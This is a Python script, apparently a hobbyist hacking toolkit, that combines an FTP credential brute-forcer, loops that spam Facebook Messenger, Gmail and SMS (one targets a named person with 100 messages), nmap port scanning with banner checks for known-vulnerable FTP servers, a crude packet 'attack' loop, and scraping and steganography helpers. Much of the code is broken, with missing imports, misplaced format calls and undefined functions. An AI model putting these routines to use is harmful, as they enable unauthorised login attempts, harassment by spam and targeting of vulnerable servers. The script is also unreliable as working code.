#!/usr/bin/env python
import datetime
import ftplib
import optparse
import random
import re
import socket

import geocoder
import nmap
import fbchat
from twilio.rest import Client
from bs4 import BeautifulSoup
from fbchat import *
from stegano import lsb
from urllib.error import HTTPError
from urllib.request import urlopen

nm = nmap.PortScanner()
parser = optparse.OptionParser()
parser.add_option("-p", "--port", action="store", type="int", dest="port", help="port to be suplied")
parser.add_option("--h0", "--host", type="string", action="store", help="the ip for given DNS", dest="host")
# parser.add_option("--scan",type="callback",callback=scan_port(host,port)))
parser.add_option("--msg", "--message", type="string", action="store", dest="message",
                  help="payload to be send to the server")
parser.add_option("--ip", type="string", action="store", dest="ip", help=" ip dns lookup")
parser.add_option("--argz", type="string", action="store", dest="argz",
                  help="criteria of how you want to scrap the data from the given website")
parser.add_option("--c", "--chat", action="store_true", dest="connection", help="if you want to chat")
# parser.add_option("--s","--scrap",type="callback",callack=scan(host,argz))
parser.add_option("--b", "--bruteforce", action="store_true", dest="brute",
                  help='decide if you want to bruteforce some ftp')
(options, args) = parser.parse_args()
host = options.host
port = options.port
message = options.message
ip = options.ip
chat = options.connection
argz = options.argz
brute = options.brute

def attack():
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(("www.google.com",80))
        s.sendall(b"GET /"+b"payload"+b" HTTP/1.1")
        s.sendall(b"Host /"+b"www.google.ro"+ b"\r\n\r\n")
        s.close()

def spam_sms():
    account_sid = ""
    auth_tokem = ""
    client = Client(account_sid,auth_tokem)

    client.message.create(
        to="+your message",
        from_="+ to person",
        body="message"
    )


def hime():
    secret = lsb.hide("/tmp/steganography.png", "Hello World")
    secret.save("/tmp/Lenna-secret.png")
    clear_message = lsb.reveal("/tmp/Lenna-secret.png")
    print(clear_message)

def fmap():
    client = Client("@gmail.com","")
    if not client.isLoggedIn():
        client.login()
    user =  client.searchForUsers('Arian Atapour')
    user = user[0]
    print("User's ID: {}".format(user.uid))
    print("User's name: {}".format(user.name))
    print("User's profile picture url: {}".format(user.photo))
    print("User's main url: {}".format(user.url))
    session_cookies = client.getSession()
    client.setSession(session_cookies)
    for i in range(0,100):
        client.sendMessage('TE SPAMEZ TAPA merge spammeru facut de mine',thread_id="",thread_type=fbchat.ThreadType.USER)
def smap():
    import smtplib
    import time

    # SMTP_SSL Example
    FROM = "@gmail.com"
    TO = "@gmail.com"
    msg = "hello"
    gmail_user = "@gmail.com"
    gmail_pwd = ""
    for i in range(0,30):
        server_ssl = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server_ssl.ehlo()  # optional, called by login()
        server_ssl.login(gmail_user, gmail_pwd)
        # ssl server doesn't support or need tls, so don't call server_ssl.starttls()
        server_ssl.sendmail(FROM, TO, msg)
        # server_ssl.quit()
        print('successfully sent the mail')
    server_ssl.close()


def bruteforce(host):
    try:
        ftp = FTP(host)
        with open('myfile.txt') as f:
            credentials = [x.strip().split(':') for x in f.readlines()]
        for username, password in credentials:
            print (username, password)
            ftp.login(username, password)
    except ftplib.error_reply:
        print ("error")

pages = set()
random.seed(datetime.datetime.now)
def getInternalLinks(bsObj,url):
    internalLinks = []
    for link in bsObj.findAll("a",href=re.compile("^(/|.*"+url+")")):
        if link.attrs['href'] is not None:
            if link.attrs['href'] not in internalLinks:
                internalLinks.append(link.attrs['href'])
    return internalLinks

def getExternalLinks(bsObj,urlexclude):
    externalLink = []
    for link in  bsObj.findAll('a',href=re.compile("^(http|www|https)((?!"+urlexclude+").)*$")):
        if link.attrs['href'] is not None:
            if link.attrs['href'] not in externalLink:
                externalLink.append(link.attrs['href'])
    return  externalLink

def splitAddress(address):
    addressParts = address.replace("http://", "").split("/")
    return addressParts

def getRandomExternalLink(startingPage):
    html = urlopen(startingPage)
    bsObj = BeautifulSoup(html.read(),'lxml')
    externalLinks = getExternalLinks(bsObj,splitAddress(startingPage)[0])
    if len(externalLinks) == 0:
        internalLinks = getInternalLinks(startingPage)
        return getNextExternalLink(internalLinks[random.randint(0,
                                            len(internalLinks)-1)])
    else:
        return externalLinks[random.randint(0, len(externalLinks)-1)]

def followExternalOnly(startSite):
    externalLink = getRandomExternalLink(startSite)
    print("Random external link is: " + externalLink)
    followExternalOnly(externalLink)

#collect internal and external links
allExtLinks = set()
allIntLinks = set()
def getAllExternalLinks(url):
    html = urlopen(url)
    bsObj = BeautifulSoup(html.read(),'lxml')
    internalLinks = getInternalLinks(bsObj,splitAddress(url)[0])
    externalLinks = getExternalLinks(bsObj,splitAddress(url)[0])
    for link in externalLinks:
        if link not in allExtLinks:
            allExtLinks.add(link)
            print(link)
    for link in internalLinks:
        if link not in allIntLinks:
            print("About to get link: " + link)
            allIntLinks.add(link)
            getAllExternalLinks(link)

def crawlDoc(url):
    """
    special fct designed only for python 3.6 doc
    :param url:
    :return: titles specif made for docs page of python
    """
    global pages
    html = urlopen("https://docs.python.org/3/"+url)
    bsObj = BeautifulSoup(html.read(), 'lxml')
    try:
        print(bsObj.h1.get_text())
        for child in  bsObj.find("table",{"class":"contentstable"}).children:
            print(child)
    except AttributeError as e:
        return None

def getName(url):
    try:
        html = urlopen(url)
    except HTTPError as e:
        return None
    try:
        bsObj = BeautifulSoup(html.read(),'lxml')
        title = bsObj.body.h1
    except AttributeError as e:
        return None
    return title

def grabme():
    try:
        html = urlopen("https://docs.python.org/2/library/sys.html")
    except HTTPError as e:
        return None
    bsObj = BeautifulSoup(html.read(), 'lxml')
    foundlist = bsObj.findAll("a", {"href": re.compile("\.\./using*")})
    for iterator in foundlist:
        print(iterator)
    for descendent in bsObj.find('table', {"class": "docutils"}).descendants:
        print(descendent)

pages = set()
def grabLinks(articleUrl):
    """
    recursive version of getAlink
    :param articleUrl: url to be crawled
    :return:
    """
    global pages
    try:
        html = urlopen("https://docs.python.org/" + articleUrl)
    except HTTPError as e:
        return None
    try:
        bsObj = BeautifulSoup(html.read(), 'lxml')
        for link in bsObj.findAll('a',href=re.compile("^(/|.*)")):
            if 'href' in link.attrs:
                if link.attrs['href'] not in pages:
                    # We have encountered a new page
                    newPage = link.attrs['href']
                    print(newPage)
                    pages.add(newPage)
                    grabLinks(newPage)
    except AttributeError as e:
        return None



def getALink(articleUrl):
    """

    :param articleUrl: get all the links from a certain page
    :return: list of links
    """
    try:
        html = urlopen("https://docs.python.org/3"+articleUrl)
    except HTTPError as e:
        return None
    try:
        bsObj = BeautifulSoup(html.read(),'lxml')
        for link in bsObj.findAll('a'):
            if 'href' in link.attrs:
                print (link.attrs['href'])
    except AttributeError as e:
        return None



def connect(tghost, tgport, payload_msg):
    fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        fd.connect((tghost, tgport))
        b = fd.send(payload_msg)
        print ("connected to port{}").format(port)
        if "220 hostname FTP server (Version wu-2.4.2-academ[BETA-18](1) Mon Jan 15 15:02:27 JST 1999) ready" in b:
            print ("found vulnerable ftp")
        elif "220 hostname FTP server (Version wu-2.5.0(1) Tue Jun 15 12:43:57 MST 1999) ready" in b:
            print ("found voulnerable ftp")
        elif "220 ProFTPD 1.2.4 Server (hostname) [hostname]" in b:
            print ("found vulnerable ftp")
        else:
            print ("we couldn't find anything souspicious about the server")
        fd.close()

    except socket.error:
        print ("cant connect to host,port closed{}").format(port)


def find_open_port(host):
    """The name of this function is pretty explicit

           with what is does.Also go check the documentation out.

        It's free id doesn't cost anything.
        https://pypi.python.org/pypi/python-nmap
    """
    name = socket.gethostbyaddr(host)[0]
    ip_from_name = socket.gethostbyname(ip)
    print( ip_from_name)
    print ("INFO ABOUT THE SPECIFIC REVERSE DNS LOOKUP: {}").format(name)
    scanned = nm.scan(host, '20-80')
    all_hosts = nm.all_hosts()
    all_ports = nm[host].all_tcp()
    print ("ALL PORTS AVBILE FROM 20-443: {}").format(" ".join(str(x) for x in all_ports))
    print ("IS THERE ANY INFORMATION ABOUT PORT 80:{}").format(nm[host].has_tcp(80))
    print ("INFO FROM PORT 80 ABOUT THE HOST: {}").format(nm[host].tcp(80))
    print ("IS PORT 80 PORT OPEN:{}").format(nm[host]['tcp'][80]['state'])
    g = geocoder.google(socket.gethostbyname(host)[0])
    print(g.latlng)



def main():
    # pydoc.doc(find_open_port)
    # find_open_port(host)
    # connect(host,port,message)
    #grabme()
    #links = getLinks("/tutorial")
    #title = getName("http://www.pythonscraping.com/pages/page1.html")
    #if title == None:
     #   print("Title could not be found")
    #else:
     #   print(title)
    #links = getALink('/tutorial')
    #grabLinks("/tutorial")
    #crawlDoc("")
    #followExternalOnly("https://www.vine.com")
    #getAllExternalLinks("https://www.twitter.com")
    #smap()
    #hime()
    #fmap()
    #spam_sms()
    #for i in range(0,100):
     #   attack()


if __name__ == '__main__':
    main()
